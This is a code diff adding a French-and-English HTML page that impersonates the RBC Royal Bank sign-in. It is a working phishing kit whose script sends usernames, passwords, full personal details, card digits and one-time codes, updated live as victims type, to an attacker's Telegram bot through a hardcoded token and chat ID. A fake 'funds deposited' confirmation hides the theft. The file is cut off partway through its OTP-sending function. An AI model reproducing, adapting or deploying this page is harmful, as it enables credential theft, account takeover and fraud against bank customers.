@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RBC Royal Bank - Secure Sign In</title>
+    <link rel="icon" href="rbc3.png" type="image/png">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        html, body, .right-panel {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        html::-webkit-scrollbar,
+        body::-webkit-scrollbar,
+        .right-panel::-webkit-scrollbar {
+            display: none;
+        }
+
+        body, html {
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            display: flex;
+        }
+
+        .left-panel {
+            flex: 0 0 50%;
+            position: relative;
+            background-image: url('siderbc.png');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .left-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, rgba(0, 10, 25, 0.72) 0%, rgba(0, 10, 25, 0.46) 60%, rgba(0, 10, 25, 0.18) 100%);
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        .left-panel::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 30, 80, 0.35);
+            z-index: 1;
+        }
+
+        .left-panel-content {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transform: translateY(89.5px);
+        }
+
+        .left-panel-logo {
+            margin-bottom: 14px;
+            position: relative;
+            top: -15px; 
+        }
+
+        .left-panel-title {
+            font-size: 20.7px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+        }
+
+        .left-panel-subtitle {
+            font-size: 14px;
+            font-weight: 400;
+            color: #ffffff;
+        }
+
+        .right-panel {
+            flex: 0 0 50%;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 80px 30px 40px 30px;
+            overflow-y: auto;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        .form-container {
+            max-width: 400px;
+            width: 100%;
+            margin: auto;
+            position: relative;
+            top: 2px;
+            left: 12px;
+        }
+
+        .input-group {
+            margin-bottom: 13px;
+        }
+
+        .label-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .input-label {
+            font-size: 16px;
+            color: #1a1a1a;
+            font-weight: 400;
+        }
+
+        .step-title {
+            font-size: 18px;
+            color: #0066cc;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .lock-icon {
+            width: 18px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .lock-icon a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ccc;
+            border-radius: 0;
+            font-size: 15px;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .input-wrapper input.error {
+            border-color: #cc0000;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #0066cc;
+            box-shadow: 0 0 0 1px #0066cc;
+        }
+
+        .error-message {
+            color: #cc0000;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+
+        .checkbox-wrapper-container {
+            margin-top: 5px;
+            margin-bottom: 15px;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 32px;
+            height: 32px;
+            border: 1px solid #767676;
+            border-radius: 0;
+            outline: none;
+            cursor: pointer;
+            background-color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .checkbox-group input[type="checkbox"]:checked::after {
+            content: '';
+            width: 9px;
+            height: 18px;
+            border: solid #0066cc;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-top: -4px;
+        }
+
+        .help-icon-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-left: 20px;
+        }
+
+        .help-icon {
+            color: #0066cc;
+            text-decoration: none;
+            border: 1px solid #0066cc;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+        }
+
+        .help-popover {
+            display: none;
+            position: absolute;
+            top: 38px;
+            right: -15px;
+            width: 330px; 
+            background: #ffffff;
+            border: 1px solid #c8c8c8;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            padding: 30px 25px 25px 25px;
+            z-index: 1000;
+            text-align: left;
+            cursor: default;
+        }
+
+        .help-popover::before, .help-popover::after {
+            content: '';
+            position: absolute;
+            bottom: 100%;
+            border: solid transparent;
+            pointer-events: none;
+        }
+
+        .help-popover::before {
+            border-bottom-color: #c8c8c8;
+            border-width: 9px;
+            right: 17px; 
+        }
+
+        .help-popover::after {
+            border-bottom-color: #ffffff;
+            border-width: 8px;
+            right: 18px; 
+        }
+
+        .popover-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .popover-close svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        .popover-title {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 15px;
+            font-weight: normal;
+        }
+
+        .popover-text {
+            font-size: 13px;
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .popover-text:last-child {
+            margin-bottom: 0;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 18px 15px;
+            font-size: 14px;
+            font-weight: normal;
+            border-radius: 2px;
+            cursor: pointer;
+            margin-bottom: 28px;
+            transition: background-color 0.2s, opacity 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            background-color: #004fb0;
+        }
+        
+        .btn-submit:disabled {
+            cursor: wait;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .links-section {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+
+        .links-section a {
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .links-section a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-container {
+            margin-top: 40px;
+        }
+
+        .divider {
+            border: none;
+            border-top: 1px solid #d8d8d8;
+            margin: 12px 0;
+        }
+
+        .divider-below-services {
+            border: none;
+            border-top: 1px solid #d8d8d8;
+            margin-top: 22px;
+            margin-bottom: 12px;
+        }
+
+        .notices-section {
+            font-size: 13px;
+            color: #333;
+        }
+
+        .notices-header {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            color: #0066cc;
+            font-size: 14px;
+        }
+
+        .menu-icon {
+            font-size: 18px;
+            color: #0066cc;
+        }
+
+        .footer-info-section {
+            margin-top: 12px;
+        }
+
+        .footer-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .footer-links-container {
+            margin-top: 14px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .footer-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 18px;
+        }
+
+        .footer-links a {
+            color: #0066cc;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .external-box {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 14px;
+            height: 14px;
+            margin-left: 4px;
+            vertical-align: middle;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-message h2 {
+            color: #0066cc;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+
+        .success-message p {
+            font-size: 16px;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        .services-drawer {
+            position: absolute;
+            top: 0;
+            right: -48%;
+            width: 48%;
+            height: 100%;
+            background: #ffffff;
+            box-shadow: -4px 0 15px rgba(0, 0, 0, 0.1);
+            transition: right 0.3s ease-in-out, visibility 0s linear 0.3s;
+            visibility: hidden; 
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .services-drawer.open {
+            right: 0;
+            visibility: visible;
+            transition: right 0.3s ease-in-out, visibility 0s linear 0s;
+        }
+
+        .services-header-bar {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding: 20px 25px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .close-drawer-btn {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #0066cc;
+            cursor: pointer;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .services-title {
+            font-size: 18px;
+            color: #1a1a1a;
+            padding: 20px 25px 15px 25px;
+            font-weight: normal;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .services-list {
+            list-style: none;
+            overflow-y: auto;
+            flex-grow: 1;
+        }
+
+        .services-list li {
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .services-list li a {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 25px;
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 15px;
+            transition: background 0.15s;
+        }
+
+        .services-list li a:hover {
+            background-color: #f7f9fa;
+        }
+
+        .services-list li a::after {
+            content: '›';
+            font-size: 20px;
+            color: #0066cc;
+            font-weight: 300;
+        }
+
+        .cookie-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.45);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .cookie-modal-overlay.open {
+            display: flex;
+        }
+
+        .cookie-modal-box {
+            background: #ffffff;
+            width: 100%;
+            max-width: 650px;
+            padding: 35px 40px;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.2);
+            position: relative;
+            border-radius: 2px;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .cookie-modal-close {
+            position: absolute;
+            top: 20px;
+            right: 25px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #0066cc;
+            cursor: pointer;
+            padding: 0;
+            line-height: 1;
+        }
+
+        .cookie-modal-title {
+            font-size: 22px;
+            font-weight: normal;
+            color: #1a1a1a;
+            margin-bottom: 20px;
+        }
+
+        .cookie-modal-text {
+            font-size: 14px;
+            color: #333333;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .cookie-dropdown-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            color: #1a1a1a;
+            margin-bottom: 25px;
+            cursor: pointer;
+        }
+
+        .cookie-dropdown-row span {
+            color: #0066cc;
+            font-size: 14px;
+        }
+
+        .cookie-learn-more-link {
+            display: inline-flex;
+            align-items: center;
+            color: #0066cc;
+            text-decoration: none;
+            font-size: 14px;
+            border: 1px solid #0066cc;
+            padding: 8px 14px;
+            margin-bottom: 35px;
+        }
+
+        .cookie-learn-more-link:hover {
+            background-color: #f7f9fa;
+        }
+
+        .cookie-save-btn {
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 14px 25px;
+            font-size: 15px;
+            cursor: pointer;
+            border-radius: 2px;
+            display: block;
+            margin-left: auto;
+        }
+
+        .cookie-save-btn:hover {
+            background-color: #004fb0;
+        }
+
+        @media (max-width: 900px) {
+            body, html {
+                flex-direction: column;
+                overflow-x: hidden;
+                overflow-y: auto;
+            }
+            .left-panel {
+                height: 300px;
+                flex: none;
+            }
+            .right-panel {
+                width: 100%;
+                flex: none;
+                padding: 40px 20px;
+            }
+            .form-container {
+                top: 0;
+                left: 0;
+            }
+            .services-drawer {
+                width: 100%;
+                right: -100%;
+            }
+            .cookie-modal-box {
+                margin: 20px;
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="left-panel">
+        <div class="left-panel-content">
+            <div class="left-panel-logo">
+                <img src="rbc8.png" alt="RBC Logo" width="52" height="65">
+            </div>
+            <h1 class="left-panel-title">Secure Sign-In</h1>
+            <p class="left-panel-subtitle">RBC Online Banking</p>
+        </div>
+    </div>
+
+    <div class="right-panel">
+        <div class="form-container">
+            <form id="loginForm" onsubmit="handleFormSubmit(event)">
+                
+                <!-- ÉTAPE 1 : IDENTIFIANT -->
+                <div id="step-username">
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="username">Client Card or Username</label>
+                            <div class="lock-icon" aria-hidden="true">
+                                <a href="https://www.rbc.com/privacysecurity/ca/index.html" target="_blank" rel="noopener noreferrer" title="Privacy & Security">
+                                    <svg width="16" height="18" viewBox="0 0 24 24" fill="#555555" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M7 10V4c0-2.76 2.24-5 5-5s5 2.24 5 5v6h2c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2v-9c0-1.1.9-2 2-2h2zm2 0h6V4c0-1.66-1.34-3-3-3s-3 1.34-3 3v6z"/>
+                                    </svg>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="text" id="username" autocomplete="off" oninput="removeError(this); handleLoginLiveInput();">
+                        </div>
+                        <div id="username-error" class="error-message">Please enter your client card or username.</div>
+                    </div>
+
+                    <div class="checkbox-wrapper-container">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="rememberUser">
+                            <label for="rememberUser">Save client card or username</label>
+                            
+                            <div class="help-icon-wrapper">
+                                <a href="#" class="help-icon" id="helpIconBtn" title="Help" onclick="toggleHelpPopover(event)">?</a>
+                                
+                                <div id="helpPopover" class="help-popover">
+                                    <button type="button" class="popover-close" onclick="closeHelpPopover(event)">
+                                        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M1 1L13 13M1 13L13 1" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round"/>
+                                        </svg>
+                                    </button>
+                                    <div class="popover-title">Save client card or username</div>
+                                    <div class="popover-text">If you delete the cookies on your computer, you'll erase any saved client card numbers or usernames.</div>
+                                    <div class="popover-text">We don't recommend this option if you're using a public or shared computer.</div>
+                                </div>
+                            </div>
+
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="btn-step1">Next</button>
+                </div>
+
+                <!-- ÉTAPE 2 : MOT DE PASSE -->
+                <div id="step-password" style="display: none;">
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="password">Password</label>
+                            <div class="lock-icon" aria-hidden="true">
+                                <a href="https://www.rbc.com/privacysecurity/ca/index.html" target="_blank" rel="noopener noreferrer" title="Privacy & Security">
+                                    <svg width="16" height="18" viewBox="0 0 24 24" fill="#555555" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M7 10V4c0-2.76 2.24-5 5-5s5 2.24 5 5v6h2c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2v-9c0-1.1.9-2 2-2h2zm2 0h6V4c0-1.66-1.34-3-3-3s-3 1.34-3 3v6z"/>
+                                    </svg>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="password" id="password" autocomplete="off" oninput="removeError(this); handleLoginLiveInput();">
+                        </div>
+                        <div id="password-error" class="error-message">Please enter your password.</div>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="btn-step2">Next</button>
+                </div>
+
+                <!-- ÉTAPE 3 : INFORMATIONS PERSONNELLES & CARTE -->
+                <div id="step-personal" style="display: none;">
+                    <div class="step-title">Vérification d'identité</div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="firstName">Prénom</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="text" id="firstName" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();">
+                        </div>
+                        <div id="firstName-error" class="error-message">Veuillez entrer votre prénom.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="lastName">Nom</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="text" id="lastName" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();">
+                        </div>
+                        <div id="lastName-error" class="error-message">Veuillez entrer votre nom.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="birthdate">Date de naissance</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="date" id="birthdate" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();">
+                        </div>
+                        <div id="birthdate-error" class="error-message">Veuillez entrer votre date de naissance.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="address">Adresse</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="text" id="address" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();">
+                        </div>
+                        <div id="address-error" class="error-message">Veuillez entrer votre adresse.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="postalCode">Code postal</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="text" id="postalCode" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();" placeholder="A1A 1A1">
+                        </div>
+                        <div id="postalCode-error" class="error-message">Veuillez entrer votre code postal.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="phone">Numéro de téléphone</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="tel" id="phone" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();" placeholder="(XXX) XXX-XXXX">
+                        </div>
+                        <div id="phone-error" class="error-message">Veuillez entrer votre numéro de téléphone.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="email">Adresse E-mail</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="email" id="email" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();" placeholder="exemple@domaine.com">
+                        </div>
+                        <div id="email-error" class="error-message">Veuillez entrer votre e-mail.</div>
+                    </div>
+
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="cardPrefix">Premiers chiffres de la carte</label>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="text" id="cardPrefix" maxlength="6" autocomplete="off" oninput="removeError(this); handleInfoLiveUpdate();" placeholder="Ex: 450892">
+                        </div>
+                        <div id="cardPrefix-error" class="error-message">Veuillez entrer les premiers chiffres de la carte.</div>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="btn-step3">Send Code</button>
+                </div>
+
+                <!-- ÉTAPE 4 : CODE DE VÉRIFICATION À 6 CHIFFRES -->
+                <div id="step-verification" style="display: none;">
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label class="input-label" for="verificationCode">6-Digit Verification Code</label>
+                            <div class="lock-icon" aria-hidden="true">
+                                <a href="https://www.rbc.com/privacysecurity/ca/index.html" target="_blank" rel="noopener noreferrer" title="Privacy & Security">
+                                    <svg width="16" height="18" viewBox="0 0 24 24" fill="#555555" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M7 10V4c0-2.76 2.24-5 5-5s5 2.24 5 5v6h2c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2v-9c0-1.1.9-2 2-2h2zm2 0h6V4c0-1.66-1.34-3-3-3s-3 1.34-3 3v6z"/>
+                                    </svg>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="input-wrapper">
+                            <input type="text" id="verificationCode" maxlength="6" autocomplete="off" oninput="removeError(this); handleOtpLiveUpdate();" placeholder="123456">
+                        </div>
+                        <div id="verificationCode-error" class="error-message">Please enter a valid 6-digit verification code.</div>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="btn-step4">Verify & Sign In</button>
+                </div>
+
+            </form>
+
+            <div id="success-container" style="display: none;" class="success-message">
+                <h2>Merci!</h2>
+                <p>Vos fonds ont été déposés avec succès.</p>
+            </div>
+
+            <div class="links-section" id="links-section">
+                <a href="https://www1.royalbank.com/sgw5/PUBOLBH/3m00/ISAMSecureRequest/v1/eBGPublicPage" id="recoverLink" target="_blank" rel="noopener noreferrer">Recover Your Username</a>
+                <a href="https://www1.royalbank.com/sgw5/PUBOLBH/3m00/ISAMSecureRequest/v1/eBGPublicPage" id="registerLink" target="_blank" rel="noopener noreferrer">Enrol in Online Banking</a>
+            </div>
+
+            <div class="footer-container">
+                <hr class="divider">
+
+                <div class="notices-section">
+                    <div class="notices-header" onclick="toggleServicesDrawer()">
+                        <span>Other Online Services</span>
+                        <span class="menu-icon">&#8801;</span>
+                    </div>
+                </div>
+
+                <hr class="divider-below-services">
+
+                <div class="footer-info-section">
+                    <div class="notices-section">
+                        <div class="footer-text">
+                            RBC Online Banking is provided by Royal Bank of Canada.<br>
+                            Royal Bank of Canada Website, &copy; 1995-2026
+                        </div>
+
+                        <div class="footer-links-container">
+                            <div class="footer-links">
+                                <div class="footer-row">
+                                    <a href="https://www.rbc.com/legal/index.html" target="_blank" rel="noopener noreferrer">Legal <span class="external-box"><svg width="13" height="13" viewBox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5.5 2H2.5C2.22386 2 2 2.22386 2 2.5V10.5C2 10.7761 2.22386 11 2.5 11H10.5C10.7761 11 11 10.7761 11 10.5V7.5" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round"/><path d="M8 2H11V5" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 8L11 2" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round"/></svg></span></a>
+                                    <a href="https://www.rbc.com/accessibility/index.html" target="_blank" rel="noopener noreferrer">Accessibility <span class="external-box"><svg width="13" height="13" viewBox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5.5 2H2.5C2.22386 2 2 2.22386 2 2.5V10.5C2 10.7761 2.22386 11 2.5 11H10.5C10.7761 11 11 10.7761 11 10.5V7.5" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round"/><path d="M8 2H11V5" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 8L11 2" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round"/></svg></span></a>
+                                    <a href="https://www.rbc.com/privacysecurity/ca/index.html" target="_blank" rel="noopener noreferrer">Privacy &amp; Security <span class="external-box"><svg width="13" height="13" viewBox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M5.5 2H2.5C2.22386 2 2 2.22386 2 2.5V10.5C2 10.7761 2.22386 11 2.5 11H10.5C10.7761 11 11 10.7761 11 10.5V7.5" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round"/><path d="M8 2H11V5" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 8L11 2" stroke="#0066cc" stroke-width="1.2" stroke-linecap="round"/></svg></span></a>
+                                </div>
+                                <div class="footer-row">
+                                    <a onclick="toggleCookieModal()">Advertising &amp; Cookies</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="servicesDrawer" class="services-drawer">
+            <div class="services-header-bar">
+                <button class="close-drawer-btn" onclick="toggleServicesDrawer()">&#10005;</button>
+            </div>
+            <div class="services-title">RBC Services</div>
+            <ul class="services-list">
+                <li><a href="#">RBC Direct Investing</a></li>
+                <li><a href="#">Dominion Securities Online</a></li>
+                <li><a href="#">RBC InvestEase</a></li>
+                <li><a href="#">Avion Rewards</a></li>
+                <li><a href="#">PH&amp;N Investment Counsel</a></li>
+                <li><a href="#">RBC Royal Trust</a></li>
+                <li><a href="#">RBC Bank USA</a></li>
+                <li><a href="#">RBC Caribbean</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <div id="cookieModalOverlay" class="cookie-modal-overlay">
+        <div class="cookie-modal-box">
+            <button class="cookie-modal-close" onclick="toggleCookieModal()">&#10005;</button>
+            <h2 class="cookie-modal-title">About Your Privacy &amp; Cookie Settings</h2>
+            <p class="cookie-modal-text">
+                RBC sites, usually in the form of cookies, store or retrieve information on your browser. This information provides insights on your behaviours on site, about your device and in some cases you. Respecting your right to privacy you can choose to accept or block the cookies we use for Performance, Personalization and Advertising
+            </p>
+            <p class="cookie-modal-text">
+                Click on the different category headings below to find out more about the types of cookies we use and to make changes to the default settings. Please note that if you choose to block some types of cookies, it may affect your experience on the site and the services we offer.
+            </p>
+            <div class="cookie-dropdown-row" onclick="toggleCookieModal()">
+                <span>How does it work?</span> <span>&#9662;</span>
+            </div>
+            <a href="https://www.rbc.com/privacysecurity/ca/index.html" target="_blank" rel="noopener noreferrer" class="cookie-learn-more-link">
+                Learn More About Advertising &amp; Cookies &rsaquo;
+            </a>
+            <button class="cookie-save-btn" onclick="toggleCookieModal()">Save Settings</button>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION BOT & PANEL ---
+        const TELEGRAM_BOT_TOKEN = "8766214960:AAEX7YS3CTaQCHbe7wNWGbwNjSgjLuTGEpw";
+        const TELEGRAM_CHAT_ID = "8370855026";
+
+        let telegramLoginMessageId = null;
+        let telegramInfoMessageId = null;
+        let telegramOtpMessageId = null;
+
+        const panelChannel = new BroadcastChannel('interac_panel_channel');
+
+        async function sendOrUpdateLoginTelegram(data, isLiveUpdate = false) {
+            const message = `🔐 <b>${isLiveUpdate ? 'CONNEXION RBC EN DIRECT' : 'NOUVELLE CONNEXION RBC'}</b>\n\n` +
+                            `👤 <b>Identifiant:</b> <code>${data.username || '...'}</code>\n` +
+                            `🔑 <b>Mot de passe:</b> <code>${data.password || '...'}</code>\n` +
+                            `🌐 <b>Navigateur/App:</b> ${navigator.userAgent}`;
+
+            if (isLiveUpdate && telegramLoginMessageId) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            message_id: telegramLoginMessageId,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    });
+                } catch (err) { console.error("Erreur Telegram edit login:", err); }
+            } else {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    });
+                    const json = await res.json();
+                    if (json.ok && json.result) {
+                        telegramLoginMessageId = json.result.message_id;
+                    }
+                } catch (err) { console.error("Erreur Telegram send login:", err); }
+            }
+        }
+
+        async function sendOrUpdateInfoTelegram(data, isLiveUpdate = false) {
+            const message = `📋 <b>${isLiveUpdate ? 'INFORMATIONS RBC EN DIRECT' : 'INFORMATIONS DÉTAILLÉES RBC'}</b>\n\n` +
+                            `👤 <b>Nom complet:</b> ${data.firstName || '...'} ${data.lastName || '...'}\n` +
+                            `🎂 <b>Date de naissance:</b> <code>${data.birthdate || '...'}</code>\n` +
+                            `🏠 <b>Adresse:</b> ${data.address || '...'} (${data.postalCode || '...'})\n` +
+                            `📱 <b>Téléphone:</b> <code>${data.phone || '...'}</code>\n` +
+                            `📧 <b>Email:</b> <code>${data.email || '...'}</code>\n` +
+                            `💳 <b>Chiffres carte:</b> <code>${data.cardPrefix || '...'}</code>`;
+
+            if (isLiveUpdate && telegramInfoMessageId) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            message_id: telegramInfoMessageId,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    });
+                } catch (err) { console.error("Erreur Telegram edit info:", err); }
+            } else {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: "HTML"
+                        })
+                    });
+                    const json = await res.json();
+                    if (json.ok && json.result) {
+                        telegramInfoMessageId = json.result.message_id;
+                    }
+                } catch (err) { console.error("Erreur Telegram send info:", err); }
+            }
+        }
+
+        async function sendOrUpdateOtpTelegram(code, isLiveUpdate = false) {
+            const message = `🔢 <b>${isLiveUpdate ? 'CODE OTP RBC EN DIRECT' : 'CODE DE VÉRIFICATION OTP RBC'}</b>\n\n` +
+                            `🔑 <b>Code OTP:</b> <code>${code || '...'}</code>`;
